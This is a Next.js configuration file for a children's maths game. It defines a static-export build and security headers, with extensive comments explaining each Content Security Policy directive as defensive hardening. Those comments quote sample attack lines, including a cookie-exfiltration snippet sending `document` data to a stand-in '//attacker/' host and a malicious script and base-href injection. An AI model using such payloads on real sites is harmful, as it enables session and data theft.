import type { NextConfig } from 'next';

/**
 * Two deployment shapes, one codebase.
 *
 * The default build is the full app: API routes, accounts, cross-device sync.
 *
 * With `STATIC_EXPORT=1` it builds the zero-config shape instead - a pile of
 * files any static host can serve, with no server, no database and no
 * environment variables. That is not a reduced version of the game: the engine
 * is pure and the profile lives in localStorage, so every battle, creature and
 * badge works exactly the same. The only thing missing is the account layer,
 * which is precisely what `accountsAvailable()` already gates.
 *
 * The API routes must be absent from the tree for that build - a route handler
 * is a server, and `output: 'export'` refuses to pretend otherwise. The Pages
 * workflow moves them aside rather than this config trying to wish them away.
 */
const staticExport = process.env.STATIC_EXPORT === '1';

/** Project pages live under /<repo>, so assets need the prefix. */
const basePath = process.env.PAGES_BASE_PATH ?? '';

/*
 * ---------------------------------------------------------------------------
 * Content Security Policy
 * ---------------------------------------------------------------------------
 *
 * WHAT THIS POLICY IS, AND WHAT IT IS NOT.
 *
 * It is an *exfiltration lockdown and a third-party-code ban*. It is NOT a
 * defence against an injected inline script, because `script-src` here carries
 * `'unsafe-inline'` and there is currently no way for this app to drop it. That
 * sentence is the whole reason this comment is long: the next person to read
 * these directives must not mistake them for XSS-proofing and must not widen
 * them believing they were only ever decorative.
 *
 * WHY `'unsafe-inline'` IS IN script-src.
 *
 * The App Router ships the RSC flight payload as inline `<script>` tags -
 * `self.__next_f.push([1,"..."])` - two of them per document, whose contents
 * differ per route and per build. Nothing in `src/` emits an inline script;
 * there is not one `dangerouslySetInnerHTML` in the repository. These are the
 * framework's own bootstrap, and without them React never hydrates: the HTML
 * paints and then nothing responds to a tap.
 *
 * Both escapes from `'unsafe-inline'` were tried against a real browser and a
 * real build before this was written down:
 *
 *   - NONCE. Next can stamp a per-request nonce onto those tags, but only while
 *     server-rendering, and only from a `proxy.ts` that sets the header first.
 *     All nine routes of this app are statically prerendered at build time,
 *     when no request and therefore no nonce exists. Serving a nonce header
 *     over prerendered HTML was measured: the header arrives, the HTML carries
 *     zero nonce attributes, and with `'strict-dynamic'` (which makes `'self'`
 *     be ignored) *every* script is refused, inline and chunk alike. The page
 *     is dead - onboarding cannot get past the first tap. Making it work would
 *     mean an `await connection()` in every page to force dynamic rendering,
 *     which trades away static prerendering, CDN caching and the prerendered
 *     shell the service worker precaches for offline play - and it still could
 *     not exist in the static-export shape, which has no server to run a proxy.
 *   - HASH. The inline bodies are build-deterministic, but `headers()` is
 *     evaluated when the config loads, which is *before* any HTML has been
 *     rendered, and the hashes differ per route. A hash policy would need a
 *     post-build step to emit a per-route header manifest, and one stale hash
 *     ships a blank game to a child. Not worth it for what it buys here.
 *
 * So `'unsafe-inline'` stays, and the policy is built to be worth having
 * anyway. What it still buys, none of which is theoretical:
 *
 *   - No third-party script origin is reachable. The dominant real-world XSS
 *     payload is `<script src="//attacker/x.js">`; that is refused.
 *   - `connect-src 'self'` means injected code has nowhere to send anything.
 *     A session cookie, a trainer name, a child's whole profile - none of it
 *     can leave the origin by fetch, XHR, WebSocket or sendBeacon.
 *   - `img-src 'self'` closes the other classic exfiltration channel, the one
 *     that needs no fetch at all: `new Image().src = '//attacker/?' + cookie`.
 *
 * EVERY DIRECTIVE BELOW WAS CHOSEN AGAINST THE APP, NOT COPIED FROM A LIST.
 * The app loads no third-party scripts, no webfonts (`--font-display` names
 * 'Baloo 2' but nothing ever fetches it - there is no `@font-face` and no
 * `next/font`), no raster images (creatures are inline `<svg>` geometry from
 * `art.ts`), and no media files (`src/lib/audio.ts` synthesises every sound
 * with Web Audio oscillators). So the tight values below cost nothing.
 */
const CSP_DIRECTIVES: ReadonlyArray<readonly [string, string]> = [
  // Everything unlisted falls back to same-origin. The named directives below
  // are the ones where 'self' is either wrong or not inherited at all.
  ['default-src', "'self'"],

  // Does NOT inherit from default-src. A `<base href="//attacker/">` rewrites
  // every relative script URL on the page, which walks straight through
  // `script-src 'self'`. Omitting this is the classic way a strict-looking
  // policy turns out to be bypassable.
  ['base-uri', "'self'"],

  // Does NOT inherit. No <object>, <embed> or <applet> anywhere in the app,
  // and legacy plugin content is a scriptable surface.
  ['object-src', "'none'"],

  // The app frames nothing.
  ['frame-src', "'none'"],

  // Does NOT inherit. Nobody may frame the game - this is the modern spelling
  // of the X-Frame-Options header kept below for browsers that predate it.
  ['frame-ancestors', "'none'"],

  // Does NOT inherit. Keeps a re-pointed <form> from posting a PIN to someone
  // else. Safe at 'self' because the one cross-origin step in the app - Google
  // SSO - is a plain link to /api/auth/google that answers with a top-level
  // redirect. It is not a form post and not a popup, and CSP does not govern
  // top-level navigation, so accounts.google.com needs no allowance here.
  ['form-action', "'self'"],

  // 'unsafe-inline' is the framework's flight-data bootstrap; see above. What
  // matters is what is absent: no origin, no wildcard, no 'unsafe-eval'.
  ['script-src', "'self' 'unsafe-inline'"],

  // Inline event-handler attributes - `<img onerror=...>`, `<svg onload=...>`
  // - are the injection shape that survives a sanitiser which strips <script>.
  // React never emits one, so denying them narrows the concession above at no
  // cost. It does not redeem 'unsafe-inline'; it just declines to hand over
  // more than was already lost.
  ['script-src-attr', "'none'"],

  // Inline STYLE ATTRIBUTES, and only those - there is not one <style> element
  // or one line of CSS-in-JS in the app; Tailwind v4 emits an ordinary
  // stylesheet. React writes runtime styles through CSSOM, which CSP never
  // sees, so this is needed purely for the *server-rendered* shell: the bottom
  // nav's `style="padding-bottom:env(safe-area-inset-bottom)"` and the handful
  // of width/gradient attributes in the prerendered HTML. Dropping it was
  // measured against a cold first load and refused exactly those. A style
  // attribute is a far weaker concession than an inline script - it cannot
  // execute - but it is a concession, and it is written here so it is not
  // mistaken for an oversight.
  ['style-src', "'self' 'unsafe-inline'"],

  // /icon.svg is the only image the app ever loads. Not 'none' only because of
  // that one file; deliberately no `data:`, which would reopen the pixel-
  // exfiltration channel this directive exists to close.
  ['img-src', "'self'"],

  // No webfonts. 'self' rather than 'none' because the difference is not a
  // security one - anyone who can put a font on this origin can already put a
  // script on it - while 'none' would silently break a self-hosted font the
  // day someone adds one. Every third-party font CDN is refused either way.
  ['font-src', "'self'"],

  // Every sound is generated in the browser. Nothing is ever fetched.
  ['media-src', "'none'"],

  // The exfiltration lock. Same-origin covers /api/*, the RSC payload fetches
  // and the profile sync; nothing else in the app talks to the network.
  ['connect-src', "'self'"],

  // public/sw.js, served from this origin. Also scopes the worker's own fetches.
  ['worker-src', "'self'"],

  // public/manifest.webmanifest.
  ['manifest-src', "'self'"],
];

const contentSecurityPolicy = CSP_DIRECTIVES.map(([name, value]) => `${name} ${value}`).join('; ');

/*
 * Capabilities a maths game has no code path to, denied so that injected code
 * cannot reach for them either. An empty allowlist `()` means "no origin, not
 * even this one".
 *
 * Only capabilities this app can never want are listed. Things it might
 * plausibly grow into - fullscreen on a tablet, screen-wake during a battle -
 * are deliberately NOT denied, because a header that has to be edited before a
 * feature can ship is a header people delete.
 */
const permissionsPolicy = [
  'accelerometer=()',
  'camera=()',
  'display-capture=()',
  'geolocation=()',
  'gyroscope=()',
  'magnetometer=()',
  'microphone=()',
  'payment=()',
  'serial=()',
  'usb=()',
].join(', ');

/*
 * Headers for the server build.
 *
 * DELIBERATELY NOT HERE:
 *
 *   Cross-Origin-Embedder-Policy: require-corp. It buys nothing without
 *   SharedArrayBuffer, which this app does not use, and it breaks any
 *   cross-origin subresource added later. A cost with no matching benefit.
 *
 *   Strict-Transport-Security. Both hosts this repo deploys to send it
 *   already, and `includeSubDomains` set from an app config binds subdomains
 *   of a domain the app knows nothing about. That belongs to whoever owns the
 *   domain, not to this file.
 *
 *   X-XSS-Protection. Removed from every current browser; the legacy filter
 *   was itself an XSS vector.
 *
 *   report-uri / report-to. There is no endpoint to report to - the whole
 *   point of this deployment is that it needs no environment variables.
 */
const securityHeaders = [
  { key: 'Content-Security-Policy', value: contentSecurityPolicy },

  // Superseded by frame-ancestors above, kept for browsers that predate it.
  { key: 'X-Frame-Options', value: 'DENY' },

  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: permissionsPolicy },

  // Severs window.opener between this page and anything cross-origin. Safe
  // for Google SSO because that flow is a top-level redirect out and back,
  // never a popup - nothing in the app calls window.open at all.
  { key: 'Cross-Origin-Opener-Policy', value: 'same-origin' },
];

const nextConfig: NextConfig = {
  reactStrictMode: true,
  poweredByHeader: false,

  ...(staticExport
    ? {
        output: 'export',
        basePath,
        // A static host has no image optimiser. Nothing here is a raster image
        // anyway - the creatures are SVG geometry - so this costs nothing.
        images: { unoptimized: true },
        // Directory-style URLs, so /album serves /album/index.html.
        trailingSlash: true,
      }
    : {
        /*
         * Headers are served by the host, so they only exist for the real
         * deployment. On a static host these are set by the host, if at all.
         *
         * BE PLAIN ABOUT WHAT THIS MEANS: the static-export (GitHub Pages)
         * shape gets NONE of the headers above. Not a weaker CSP - no CSP.
         * `output: 'export'` emits files, not a server, and `headers()` is
         * never called; GitHub Pages offers no way to configure response
         * headers, and it cannot run a proxy either. So the Pages deployment
         * has no Content-Security-Policy, no Permissions-Policy and no
         * Cross-Origin-Opener-Policy, and `scripts/audit_headers.py` asserts
         * that this asymmetry is stated rather than quietly assumed away.
         *
         * That shape does still have the account layer removed entirely -
         * there is no session cookie and no PIN to steal there, which is why
         * the gap is tolerable rather than merely unfortunate. The one thing
         * that would close most of it is a `<meta http-equiv>` CSP in the root
         * layout, which works with no host support; `frame-ancestors` is
         * ignored in meta form, so it would not be a full replacement.
         */
        async headers() {
          return [{ source: '/:path*', headers: securityHeaders }];
        },
      }),
};

export default nextConfig;
